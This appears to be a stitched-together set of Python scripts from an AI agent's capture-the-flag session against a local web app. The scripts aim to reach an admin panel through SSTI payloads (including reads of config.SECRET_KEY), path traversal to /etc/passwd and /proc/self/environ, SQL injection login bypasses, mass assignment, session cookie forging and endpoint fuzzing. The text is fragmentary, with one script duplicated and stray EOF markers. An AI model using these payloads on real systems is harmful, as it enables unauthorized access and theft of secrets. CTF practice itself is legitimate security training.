From here, you can customize your SSID, set up security protocols, and ensure seamless connectivity for all your devices. args.content:
#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

# Create a session
s = requests.Session()

# Login
login_resp = s.post(f"{base_url}/login", data={"username": "test", "password": "test"})
print("Login status:", login_resp.status_code)
print("Session cookies:", s.cookies.get_dict())

# Check wifi_settings with debug=session
resp = s.get(f"{base_url}/wifi_settings?debug=session")
print("\n--- wifi_settings?debug=session ---")
print("Status:", resp.status_code)
print("Cookies after:", s.cookies.get_dict())
print("Headers:", dict(resp.headers))

# Look for any differences in the page
# Check if there's hidden content
if "session" in resp.text.lower() and "admin" in resp.text.lower():
    print("Found 'session' and 'admin' in response")

# Try accessing admin panel
admin_resp = s.get(f"{base_url}/admin_panel")
print("\n--- Admin Panel ---")
print("Status:", admin_resp.status_code)
if "Only administrator" in admin_resp.text:
    print("Still blocked from admin panel")
else:
    print("Might have admin access!")
    print(admin_resp.text[:1000])

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

# Create a session
s = requests.Session()

# Login
login_resp = s.post(f"{base_url}/login", data={"username": "test", "password": "test"})
print("Login status:", login_resp.status_code)
print("Session cookies:", s.cookies.get_dict())

# Check wifi_settings with debug=session
resp = s.get(f"{base_url}/wifi_settings?debug=session")
print("\n--- wifi_settings?debug=session ---")
print("Status:", resp.status_code)
print("Cookies after:", s.cookies.get_dict())
print("Headers:", dict(resp.headers))

# Try accessing admin panel
admin_resp = s.get(f"{base_url}/admin_panel")
print("\n--- Admin Panel ---")
print("Status:", admin_resp.status_code)
if "Only administrator" in admin_resp.text:
    print("Still blocked from admin panel")
else:
    print("Might have admin access!")
    print(admin_resp.text[:1000])
EOF

cat > /home/smartdatayb/claudecode-ctf/decode_session.py << 'EOF'
#!/usr/bin/env python3
import base64
import zlib
import json

# Session cookie
cookie = "vmwy6oMR5Of7kCHQALK9FzSCj0NcLU_uT2l6lKCwWN8"

# Try different decoding approaches
print("Raw cookie:", cookie)
print()

# Flask session format: base64(payload).base64(timestamp).base64(signature)
# If it contains a period, it might be a signed cookie
if '.' in cookie:
    parts = cookie.split('.')
    print(f"Parts: {len(parts)}")
    for i, part in enumerate(parts):
        try:
            # Add padding
            padded = part + '=' * (4 - len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            print(f"Part {i}: {decoded}")
            # Try to decompress
            try:
                decompressed = zlib.decompress(decoded)
                print(f"  Decompressed: {decompressed}")
            except:
                pass
        except Exception as e:
            print(f"Part {i} error: {e}")
else:
    print("No dots in cookie - might be a simple session ID or non-Flask format")
    
    # Try base64 decode
    try:
        padded = cookie + '=' * (4 - len(cookie) % 4)
        decoded = base64.urlsafe_b64decode(padded)
        print(f"Decoded bytes: {decoded.hex()}")
        print(f"Decoded raw: {decoded}")
    except Exception as e:
        print(f"Decode error: {e}")
EOF

cat > /home/smartdatayb/claudecode-ctf/test_debug.py << 'EOF'
#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://localhost:80"

# Create session and login
s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

# Test various debug values
debug_values = [
    "session",
    "{{session}}",
    "{{session['admin']}}",
    "{{session.admin}}",
    "{{request}}",
    "{{request.environ}}",
    "{{config}}",
    "{{config.SECRET_KEY}}",
    "${session}",
    "${7*7}",
    "session=1",
    "is_admin",
    "role",
    "user",
    "__class__",
]

for value in debug_values:
    encoded = urllib.parse.quote(value)
    resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
    # Check if response contains anything unusual
    if value in resp.text or "49" in resp.text or "SECRET" in resp.text:
        print(f"[!] debug={value} might be interesting")
        # Look for the value in the response
        if value.startswith("{{") and value.endswith("}}"):
            inner = value[2:-2]
            if inner in resp.text or "class" in resp.text.lower():
                print(f"    Found something: check response")
                
# Try SSTI payload that might set session
print("\nTrying to set session values via SSTI...")
ssti_payloads = [
    "{% set session['admin']=True %}",
    "{% set session.admin=True %}",
    "{{session.update({'admin': True})}}",
]

for payload in ssti_payloads:
    encoded = urllib.parse.quote(payload)
    s.get(f"{base_url}/wifi_settings?debug={encoded}")
    # Check admin panel
    resp = s.get(f"{base_url}/admin_panel")
    if "Only administrator" not in resp.text:
        print(f"[!] Payload worked: {payload}")
        print(resp.text[:500])
        break
else:
    print("No SSTI payloads worked for session manipulation")
EOF

cat > /home/smartdatayb/claudecode-ctf/mass_assign.py << 'EOF'
#!/usr/bin/env python3
import requests
import json

base_url = "http://localhost:80"

# Test mass assignment with various admin-related fields
test_params = [
    {"username": "test", "password": "test", "is_admin": True},
    {"username": "test", "password": "test", "admin": True},
    {"username": "test", "password": "test", "role": "admin"},
    {"username": "test", "password": "test", "usertype": "admin"},
    {"username": "test", "password": "test", "level": "admin"},
    {"username": "test", "password": "test", "admin": 1},
    {"username": "test", "password": "test", "is_admin": 1},
    {"username": "test", "password": "test", "is_admin": "true"},
    {"username": "test", "password": "test", "__class__.__init__.__globals__": "os"},
]

for params in test_params:
    s = requests.Session()
    resp = s.post(f"{base_url}/login", data=params)
    
    # Check if we can access admin panel
    admin_resp = s.get(f"{base_url}/admin_panel")
    if "Only administrator" not in admin_resp.text:
        print(f"[!] Params worked: {params}")
        print(admin_resp.text[:500])
        break
else:
    print("No mass assignment worked")

# Test with JSON content type

admin_resp = s.get(f"{base_url}/admin_panel")

#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://localhost:80"

# Create session and login
s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

# Test path traversal through debug parameter
traversal_paths = [
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/proc/self/environ",
    "../app.py",
    "../../app/app.py",
    "/var/log/apache2/access.log",
    "../../../var/www/html/app.py",
    "file:///etc/passwd",
]

for path in traversal_paths:
    encoded = urllib.parse.quote(path)
    resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
    
    # Check for signs of file inclusion
    if "root:" in resp.text or "www-data" in resp.text or "SECRET" in resp.text:
        print(f"[!] Path traversal worked: {path}")
        print(resp.text[:1000])
        break
    
    if len(resp.text) != 5040:  # Check if response size is different
        print(f"[?] Different response size for {path}: {len(resp.text)}")
else:
    print("No path traversal worked through debug param")

# Also try on different endpoints
for endpoint in ["/login", "/dashboard", "/admin_panel"]:
    for path in ["../../../etc/passwd", "session"]:
        encoded = urllib.parse.quote(path)
        resp = s.get(f"{base_url}{endpoint}?debug={encoded}")
        if "root:" in resp.text:
            print(f"[!] Path traversal worked on {endpoint}?debug={path}")
EOF

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

# SQL injection payloads
payloads = [
    ("admin'--", ""),
    ("admin' OR '1'='1'--", ""),
    ("admin' OR 1=1--", ""),
    ("' OR '1'='1'--", ""),
    ("' OR 1=1--", ""),
    ("admin'/*", ""),
    ("test' AND is_admin=1--", "test"),
    ("admin", "' OR '1'='1'--"),
    ("admin", "' OR 1=1--"),
    ("' OR ''='", "' OR ''='"),
    ("admin' OR is_admin=1--", "test"),
    ("test", "' OR is_admin=1--"),
    ("' UNION SELECT 'admin','admin'--", ""),
    ("admin' AND 1=1#", ""),
    ("admin", "' UNION SELECT 1,1,1--"),
]

for username, password in payloads:
    s = requests.Session()
    resp = s.post(f"{base_url}/login", data={"username": username, "password": password})
    
    if resp.status_code == 302 or "dashboard" in resp.text.lower():
        print(f"[?] Possible success with username={username!r}, password={password!r}")
        
        # Try to access admin panel
        admin_resp = s.get(f"{base_url}/admin_panel")
        if "Only administrator" not in admin_resp.text:
            print("[!] Got admin access!")
            print(admin_resp.text[:1000])
            break
        else:
            print("    ...but still not admin")

print("\nDone testing SQLi")
EOF

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

# Test 1: Access debug=session before login
print("Test 1: debug=session before login")
s = requests.Session()
resp = s.get(f"{base_url}/wifi_settings?debug=session")
print(f"Status: {resp.status_code}")
print(f"Cookies: {s.cookies.get_dict()}")

# Then login
resp = s.post(f"{base_url}/login", data={"username": "test", "password": "test"})
print(f"After login cookies: {s.cookies.get_dict()}")

# Check admin
resp = s.get(f"{base_url}/admin_panel")
if "Only administrator" not in resp.text:
    print("[!] Got admin access!")
    print(resp.text[:500])

# Test 2: Login, then debug, then check admin
print("\n\nTest 2: Login, debug, check admin")
s2 = requests.Session()
s2.post(f"{base_url}/login", data={"username": "test", "password": "test"})
print(f"After login: {s2.cookies.get_dict()}")

# Visit debug endpoint
resp = s2.get(f"{base_url}/wifi_settings?debug=session")
print(f"After debug: {s2.cookies.get_dict()}")

# Check admin
resp = s2.get(f"{base_url}/admin_panel")
if "Only administrator" not in resp.text:
    print("[!] Got admin access!")
    print(resp.text[:500])

# Test 3: Check if session cookie value changes
print("\n\nTest 3: Monitoring session changes")
s3 = requests.Session()
s3.post(f"{base_url}/login", data={"username": "test", "password": "test"})
initial_session = s3.cookies.get("session")
print(f"Initial session: {initial_session}")

# Visit debug
s3.get(f"{base_url}/wifi_settings?debug=session")
after_debug = s3.cookies.get("session")
print(f"After debug: {after_debug}")

if initial_session != after_debug:
    print("[!] Session changed!")
else:
    print("Session unchanged")

# Test 4: Try accessing /admin_panel?debug=session
print("\n\nTest 4: admin_panel with debug param")
resp = s3.get(f"{base_url}/admin_panel?debug=session")
if "Only administrator" not in resp.text:
    print("[!] Got admin access via admin_panel?debug=session!")
    print(resp.text[:1000])
else:
    print("Still blocked")

# Test 5: Try POST to admin_panel
print("\n\nTest 5: POST to admin_panel")
resp = s3.post(f"{base_url}/admin_panel", data={"debug": "session"})
print(f"Status: {resp.status_code}")
if "Only administrator" not in resp.text:
    print("[!] Got admin access via POST!")
    print(resp.text[:1000])
EOF

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

# Test various session fixation scenarios
tests = [
    # Try setting debug to values that might set session properties
    ("debug", "admin"),
    ("debug", "is_admin=True"),
    ("debug", "is_admin=1"),  
    ("debug", "role=admin"),
    ("debug", '{"admin": true}'),
    ("debug", '{"is_admin": true}'),
    ("debug", "session[admin]=1"),
    ("debug", "session[is_admin]=true"),
    
    # Direct session manipulation attempts
    ("session", "admin"),
    ("session[admin]", "true"),
    ("is_admin", "true"),
    ("role", "admin"),
    
    # Combination of both
    ("debug", "session&is_admin=true"),
]

for param, value in tests:
    s = requests.Session()
    s.post(f"{base_url}/login", data={"username": "test", "password": "test"})
    
    # Visit wifi_settings with the parameter
    url = f"{base_url}/wifi_settings?{param}={requests.utils.quote(value)}"
    s.get(url)
    
    # Check admin
    resp = s.get(f"{base_url}/admin_panel")
    if "Only administrator" not in resp.text:
        print(f"[!] {param}={value} worked!")
        print(resp.text[:500])
        break
else:
    print("No session fixation method worked")

# Try setting the session cookie directly
print("\n\nTrying manual session cookie manipulation...")
admin_session_candidates = [
    "admin",
    "administrator", 
    "admin_session",
    "000000000000000000000000000000000000000000",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
]

for session_val in admin_session_candidates:
    s = requests.Session()
    s.cookies.set("session", session_val, domain="localhost")
    resp = s.get(f"{base_url}/admin_panel")
    if resp.status_code == 200 and "Only administrator" not in resp.text:
        print(f"[!] Session cookie {session_val} worked!")
        print(resp.text[:500])
        break
else:
    print("No manual session cookie worked")
EOF

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

# Try to trigger errors that might reveal info
error_triggers = [
    "/wifi_settings?debug=__import__",
    "/wifi_settings?debug={{''.__class__.__mro__[2].__subclasses__()}}",
    "/wifi_settings?debug=%00",
    "/wifi_settings?debug=",
    "/wifi_settings?debug[]=1",
    "/wifi_settings?debug[admin]=true",
    "/wifi_settings?debug=session&admin=true",
    "/wifi_settings?debug=session,admin",
    "/wifi_settings?debug=session%00admin",
    "/wifi_settings/debug/session",
    "/wifi_settings/../admin_panel",
    "/debug/session",
    "/?debug=session",
    "/dashboard?debug=session",
]

for endpoint in error_triggers:
    try:
        resp = s.get(f"{base_url}{endpoint}")
        if resp.status_code != 200:
            print(f"[?] {endpoint} returned {resp.status_code}")
        if "error" in resp.text.lower() and "traceback" in resp.text.lower():
            print(f"[!] {endpoint} caused a traceback!")
            print(resp.text[:1000])
        if "session" in resp.text and "{" in resp.text and "}" in resp.text:
            # Look for JSON-like session data
            import re
            match = re.search(r'\{[^}]+\}', resp.text)
            if match:
                print(f"[?] Possible JSON in {endpoint}: {match.group()}")
    except Exception as e:
        print(f"[!] Error with {endpoint}: {e}")

# Try with different HTTP methods
print("\n\nTrying different HTTP methods on /wifi_settings?debug=session")
for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD"]:
    try:
        resp = s.request(method, f"{base_url}/wifi_settings?debug=session")
        if resp.status_code not in [200, 405]:
            print(f"[?] {method}: status {resp.status_code}")
        if method == "HEAD":
            print(f"HEAD headers: {dict(resp.headers)}")
    except Exception as e:
        print(f"Error with {method}: {e}")
EOF

#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://localhost:80"

s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

# Test SSTI with 7*7=49
payload = "{{7*7}}"
encoded = urllib.parse.quote(payload)
resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")

print("Looking for '49' in response...")
if "49" in resp.text:
    print("[!] Found 49!")
    # Find context around it
    idx = resp.text.find("49")
    print(f"Context: ...{resp.text[max(0,idx-50):idx+50]}...")
else:
    print("No 49 found")

# Try different SSTI markers
markers = [
    ("{{7*7}}", "49"),
    ("{{7+7}}", "14"),
    ("${{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
]

print("\nTesting various template markers...")
for payload, expected in markers:
    encoded = urllib.parse.quote(payload)
    resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
    if expected in resp.text:
        # Make sure it's not just in the URL/comment
        clean = re.sub(r'href="[^"]*"', '', resp.text)
        clean = re.sub(r'<!--.*?-->', '', clean, flags=re.DOTALL)
        if expected in clean:
            print(f"[!] {payload} => {expected} found in clean response!")
        else:
            print(f"[?] {payload} => {expected} might be URL artifact")

# Try dumping session via SSTI
session_payloads = [
    "{{session}}",
    "{{request.cookies}}",
    "{{request.cookies.session}}",
    "{{config}}",
    "{{g}}",
    "{{get_flashed_messages}}",
]

print("\nTrying session dump payloads...")
for payload in session_payloads:
    encoded = urllib.parse.quote(payload)
    resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
    # Look for non-HTML content that might be session data
    if re.search(r'<.+admin.+>', resp.text, re.IGNORECASE):
        print(f"[?] {payload} might reveal admin")

#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://localhost:80"

s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

# Find where the SSTI output appears
payload = "{{7+7}}"
encoded = urllib.parse.quote(payload)
resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")

# Find the context of "14"
text = resp.text
idx = text.find("14")
while idx != -1:
    context = text[max(0,idx-100):idx+100]
    # Skip if it's in a CSS or boring context
    if "background-color" not in context and "font-size" not in context:
        print(f"Found '14' at position {idx}:")
        print(f"Context: {context[:200]}")
        print("---")
    idx = text.find("14", idx+1)

# Now try to read session
print("\n\nTrying to read session...")
payload = "{{session}}"
encoded = urllib.parse.quote(payload)
resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
print(f"Response length: {len(resp.text)}")

# Look for unusual content
normal_resp = s.get(f"{base_url}/wifi_settings")
if len(resp.text) != len(normal_resp.text):
    print(f"[!] Different response size: {len(resp.text)} vs {len(normal_resp.text)}")
    
# Find what's different
diff_chars = []
for i, (a, b) in enumerate(zip(resp.text, normal_resp.text)):
    if a != b:
        diff_chars.append((i, a, b))
        if len(diff_chars) < 10:
            print(f"Diff at {i}: '{a}' vs '{b}'")

# Try to get more session info
payloads_to_try = [
    "{{session.items()}}",
    "{{session.keys()}}",
    "{{dict(session)}}",
    "{{session|list}}",
    "{{session['is_admin']}}",
    "{{session.get('is_admin')}}",
    "{{session.get('admin')}}",
    "{{session.get('role')}}",
    "{{session.get('user')}}",
    "{{session.get('username')}}",
]

print("\n\nTrying to extract session data...")
for payload in payloads_to_try:
    encoded = urllib.parse.quote(payload)
    resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
    
    # Look for the output (should appear where we found 14)
    # Let's search for common session value patterns
    if "'admin'" in resp.text or '"admin"' in resp.text:
        print(f"[!] {payload} might show admin info")
    if "True" in resp.text or "False" in resp.text:
        print(f"[?] {payload} might show boolean value")
        # Find it
        for pattern in ["True", "False"]:
            idx = resp.text.find(pattern)
            if idx != -1:
                print(f"    Found {pattern} at {idx}: {resp.text[max(0,idx-20):idx+30]}")

#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://localhost:80"

s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

# Use a unique marker
markers = [
    ("{{7*191}}", "1337"),  # 7*191=1337
    ("{{999+888}}", "1887"),
    ("{{123456789}}", "123456789"),
    ('{{"SSTI_MARKER"}}', "SSTI_MARKER"),
    ('{{request.method}}', "GET"),
]

for payload, expected in markers:
    encoded = urllib.parse.quote(payload)
    resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
    
    if expected in resp.text:
        print(f"[!] {payload} -> Found '{expected}' in response!")
        
        # Find context
        idx = resp.text.find(expected)
        print(f"Context: ...{resp.text[max(0,idx-100):idx+len(expected)+100]}...")
        
        # Check if it's not in the URL or a comment
        before = resp.text[max(0,idx-50):idx]
        if "href" not in before and "<!--" not in before:
            print("[!] This looks like real SSTI output!")
    else:
        print(f"[-] {payload} -> '{expected}' not found")

# Try string concatenation to confirm SSTI
payload = '{{"A"+"B"}}'
encoded = urllib.parse.quote(payload)
resp = s.get(f"{base_url}/wifi_settings?debug={encoded}")
if "AB" in resp.text:
    print("[!] String concatenation works!")
    idx = resp.text.find("AB")
    print(f"Found at {idx}: {resp.text[max(0,idx-50):idx+50]}")
EOF

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

# Test 1: Access debug endpoint multiple times then check admin
print("Test 1: Multiple debug accesses...")
s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

for i in range(5):
    s.get(f"{base_url}/wifi_settings?debug=session")

resp = s.get(f"{base_url}/admin_panel")
if "Only administrator" not in resp.text:
    print("[!] Multiple debug accesses worked!")
    print(resp.text[:500])

# Test 2: Access debug endpoint NOT logged in
print("\nTest 2: Debug access without login...")
s2 = requests.Session()
s2.get(f"{base_url}/wifi_settings?debug=session")
s2.post(f"{base_url}/login", data={"username": "test", "password": "test"})
resp = s2.get(f"{base_url}/admin_panel")
if "Only administrator" not in resp.text:
    print("[!] Pre-login debug access worked!")
    print(resp.text[:500])

# Test 3: Try POST to debug endpoint
print("\nTest 3: POST to debug endpoint...")
s3 = requests.Session()
s3.post(f"{base_url}/login", data={"username": "test", "password": "test"})
s3.post(f"{base_url}/wifi_settings?debug=session", data={})
resp = s3.get(f"{base_url}/admin_panel")
if "Only administrator" not in resp.text:
    print("[!] POST to debug worked!")
    print(resp.text[:500])

# Test 4: Check if there's something in the session we can read
print("\nTest 4: Checking session via different endpoints...")
s4 = requests.Session()
s4.post(f"{base_url}/login", data={"username": "test", "password": "test"})
# Visit debug
s4.get(f"{base_url}/wifi_settings?debug=session")
# Check dashboard for any changes
dashboard = s4.get(f"{base_url}/dashboard")
if "admin" in dashboard.text.lower():
    print("Dashboard mentions admin somewhere")

# Test 5: Try accessing a session dump endpoint
print("\nTest 5: Looking for session dump...")
for endpoint in ["/session", "/api/session", "/debug/session", "/dump", "/session.json"]:
    s = requests.Session()
    s.post(f"{base_url}/login", data={"username": "test", "password": "test"})
    s.get(f"{base_url}/wifi_settings?debug=session")
    resp = s.get(f"{base_url}{endpoint}")
    if resp.status_code != 404 and "Not Found" not in resp.text:
        print(f"[?] {endpoint}: {resp.status_code}")
        print(resp.text[:200])

print("\nDone with sequence tests")
EOF

#!/usr/bin/env python3
import requests

base_url = "http://localhost:80"

endpoints = [
    "/register", "/signup", "/create", "/users", "/user",
    "/api", "/api/users", "/api/admin", "/api/flag",
    "/flag", "/flag.txt", "/secret", "/secrets",
    "/config", "/settings", "/preferences",
    "/backup", "/backups", "/export",
    "/admin", "/administrator", "/root",
    "/test", "/testing", "/dev", "/development",
    "/debug", "/debugger", "/console",
    "/shell", "/exec", "/run", "/cmd",
    "/phpinfo", "/info", "/status",
    "/health", "/ping", "/version",
    "/static/flag.txt", "/static/secret.txt",
    "/files", "/uploads", "/download",
    "/.well-known/security.txt",
    "/sitemap.xml", "/robots.txt",
    "/swagger", "/api-docs", "/openapi",
]

s = requests.Session()
s.post(f"{base_url}/login", data={"username": "test", "password": "test"})

print("Fuzzing endpoints...")
for endpoint in endpoints:
    try:
        resp = s.get(f"{base_url}{endpoint}", timeout=5)
        if resp.status_code != 404:
            print(f"[{resp.status_code}] {endpoint}")
            if resp.status_code == 200 and "flag" in resp.text.lower():
                print(f"[!] Might contain flag: {resp.text[:200]}")
    except:
        pass

# Also try PUT/PATCH on wifi_settings to modify session
print("\n\nTrying PUT/PATCH on wifi_settings...")
for method in ["PUT", "PATCH"]:
    data = {"admin": True, "is_admin": True, "role": "admin"}
    resp = s.request(method, f"{base_url}/wifi_settings", json=data)
    print(f"{method}: {resp.status_code}")
    
    # Check admin
    admin = s.get(f"{base_url}/admin_panel")
    if "Only administrator" not in admin.text:
        print("[!] Got admin!")
        print(admin.text[:500])
EOF
